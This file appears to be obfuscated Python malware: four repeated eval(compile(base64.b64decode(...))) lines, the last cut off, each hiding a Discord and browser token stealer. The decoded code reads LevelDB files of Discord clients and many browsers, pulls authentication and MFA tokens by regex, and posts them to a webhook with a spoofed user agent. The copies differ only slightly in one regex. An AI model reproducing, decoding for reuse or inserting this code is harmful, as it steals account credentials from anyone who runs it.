eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXszMX0iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAgJ21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))

eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXszMH0iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAgJ21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))

eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyOX0iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAgJ21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKcGF0aF8gPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9QRVJBIEdYIFNUQUJMRVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCmRlZiBtYWluKCk6CiAgICAgICAgcyA9IFsgIkxJU1QiLCAiRk9SIiwgIlUiLCAiVE8iLCAiV0FTVEUiLCAiVVIiLCAiVElNRSIsICIhIiBdCiAgICAgICAgZm9yIGkgaW4gczoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbWVzc2FnZSA9ICdAZXZlcnlvbmUnIGlmIFBJTkdfTUUgZWxzZSAnJyAKICAgICAgICAgICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgICAgICAgICAgZm9yIFBMQVRGT1JNLCBEQiBpbiBwYXRocy5pdGVtcygpOgogICAgICAgICAgICAgICAgICAgICAgICBpZiBub3Qgb3MucGF0aC5leGlzdHMoREIpOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgY29udGludWUKICAgICAgICAgICAgICAgICAgICB0ZXN0ZSA9IG9zLnBhdGguZXhpc3RzKHBhdGgpCiAgICAgICAgICAgICAgICAgICAgVEVTVEUyID0gb3MucGF0aC5leGlzdHMocGF0aF8pCiAgICAgICAgICAgICAgICAgICAgcHJpbnQodGVzdGUsIHRlc3RlKQogICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgKz0gZicqKkJSVVRFRk9SQ0UgI0xPRyAtIHtQTEFURk9STS51cHBlcigpfSAoU1RBUlRFRCBBVDoge2RhdGV0aW1lLmRhdGV0aW1lLm5vdygpLnJlcGxhY2Uoc2Vjb25kPTAsIG1pY3Jvc2Vjb25kPTApfSkqKicKCiAgICAgICAgICAgICAgICAgICAgYXV0aCA9IGJydXRlKERCKQogICAgICAgICAgICAgICAgICAgIGlmIGxlbihhdXRoKSA+IDA6CiAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiBhdXRoOgogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSBmJ2BgYFxue3Rva2VufVxuYGBgJwogICAgICAgICAgICAgICAgICAgICAgICAgICAgbWVzc2FnZSArPSAnJwogICAgICAgICAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICAgICAgICAgIG1lc3NhZ2UgPSAnJwoKICAgICAgICAgICAgICAgICAgICBoZWFkZXJzID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24vanNvbicsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiAnTW96aWxsYS81LjAgKFgxMTsgTGludXggeDg2XzY0KSBBcHBsZVdlYktpdC81MzcuMTEgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMjMuMC4xMjcxLjY0IFNhZmFyaS81MzcuMTEnCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmR1bXBzKHsnY29udGVudCc6IG1lc3NhZ2V9KQoKICAgICAgICAgICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJlcSA9IFJlcXVlc3QoV0VCSE9PS19VUkwsIGRhdGE9cGF5bG9hZC5lbmNvZGUoKSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICAgICAgICAgICAgICB1cmxvcGVuKHJlcSkKICAgICAgICAgICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgICAgICAgICAgaWYgaSA9PSAiISI6CiAgICAgICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgICAgICBwYXNzICAKCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgIG1haW4oKQ=="), "<string>", 'exec'))

eval(compile(base64.b64decode("aW1wb3J0IG9zLCBzeXMKaW1wb3J0IHJlCmltcG9ydCBqc29uCmltcG9ydCByYW5kb20KaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnJlcXVlc3QgaW1wb3J0IFJlcXVlc3QsIHVybG9wZW4KCiMgTUVOVElPTlMKUElOR19NRSA9IEZhbHNlCgoKZGVmIGJydXRlKERCKToKICAgIExJU1QgPSAiREVGQVVMVCIsICJQUk9GSUxFIDEiLCAiUFJPRklMRSAyIiwgIlBST0ZJTEUgMyIKICAgIERCICs9IGYnXFx7cmFuZG9tLmNob2ljZShMSVNUKS50aXRsZSgpfVxcTE9DQUwgU1RPUkFHRVxcTEVWRUxEQicKCiAgICBhdXRoID0gW10KCiAgICBmb3IgZmlsZV9uYW1lIGluIG9zLmxpc3RkaXIoREIpOgogICAgICAgIGlmIG5vdCBmaWxlX25hbWUuZW5kc3dpdGgoJy5sb2cnKSBhbmQgbm90IGZpbGVfbmFtZS5lbmRzd2l0aCgnLmxkYicpOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBmb3IgbGluZSBpbiBbeC5zdHJpcCgpIGZvciB4IGluIG9wZW4oZid7REJ9XFx7ZmlsZV9uYW1lfScsIGVycm9ycz0naWdub3JlJykucmVhZGxpbmVzKCkgaWYgeC5zdHJpcCgpXToKICAgICAgICAgICAgICAgIGZvciByZWdleCBpbiAociJbXHctXXsyNH1cLltcdy1dezZ9XC5bXHctXXsyOH0iLCAibWZhXC5bXHctXXs4NH0iKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciB0b2tlbiBpbiByZS5maW5kYWxsKHJlZ2V4LCBsaW5lKToKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXV0aC5hcHBlbmQodG9rZW4pCiAgICAgICAgcmV0dXJuIGF1dGgKCkxPQ0FMID0gb3MuZ2V0ZW52KCdMT0NBTEFQUERBVEEnKQpST0FNSU5HID0gb3MuZ2V0ZW52KCdBUFBEQVRBJykKCnBhdGhzID0gewogICAgICAgICdkaXNjb3JkJzogUk9BTUlORyArICdcXERJU0NPUkQnLAogICAgICAgICdkaXNjb3JkIGNhbmFyeSc6IFJPQU1JTkcgKyAnXFxESVNDT1JEQ0FOQVJZJywKICAgICAgICAnZGlzY29yZCBwdGInOiBST0FNSU5HICsgJ1xcRElTQ09SRFBUQicsCiAgICAgICAgJ2dvb2dsZSBjaHJvbWUnOiBMT0NBTCArICdcXEdPT0dMRVxcQ0hST01FXFxVU0VSIERBVEEnLAogICAgICAgICdicmF2ZSc6IExPQ0FMICsgJ1xcQlJBVkVTT0ZUV0FSRVxcQlJBVkUtQlJPV1NFUlxcVVNFUiBEQVRBJywKICAgICAgICAneWFuZGV4JzogTE9DQUwgKyAnXFxZQU5ERVhcXFlBTkRFWEJST1dTRVJcXFVTRVIgREFUQScsICAgICAgICAKICAgICAgICAnYW1pZ28nOiBMT0NBTCArICdcXEFNSUdPXFxVU0VSIERBVEEnLAogICAgICAgICd0b3JjaCc6IExPQ0FMICsgJ1xcVE9SQ0hcXFVTRVIgREFUQScsCiAgICAgICAgJ2tvbWV0YSc6IExPQ0FMICsgJ1xLT01FVEFcXFVTRVIgREFUQScsCiAgICAgICAgJ29yYml0dW0nOiBMT0NBTCArICdcXE9SQklUVU1cXFVTRVIgREFUQScsCiAgICAgICAgJ2NlbnQtYnJvd3Nlcic6IExPQ0FMICsgJ1xcQ0VOVEJST1dTRVJcXFVTRVIgREFUQScsCiAgICAgICAgJzdzdGFyJzogTE9DQUwgKyAnXFw3U1RBUlxcN1NUQVJcXFVTRVIgREFUQScsCiAgICAgICAgJ3NwdXRuaWsnOiBMT0NBTCArICdcXFNQVVROSUtcXFNQVVROSUtcXFVTRVIgREFUQScsCiAgICAgICAgJ3ZpdmFsZGknOiBMT0NBTCArICdcXFZJVkFMRElcXFVTRVIgREFUQScsCiAgICAgICAgJ2dvb2dsZS1jaHJvbWUtc3hzJzogTE9DQUwgKyAnXFxHT09HTEVcXENIUk9NRSBTWFNcXFVTRVIgREFUQScsCiAgICAgICAgJ21pY3Jvc29mdCBlZGdlJzogTE9DQUwgKyAnXFxNSUNST1NPRlRcXEVER0VcXFVTRVIgREFUQScKICAgIH0KCnBhdGggPSBST0FNSU5HICsgJ1xcT1BFUkEgU09GVFdBUkVcXE9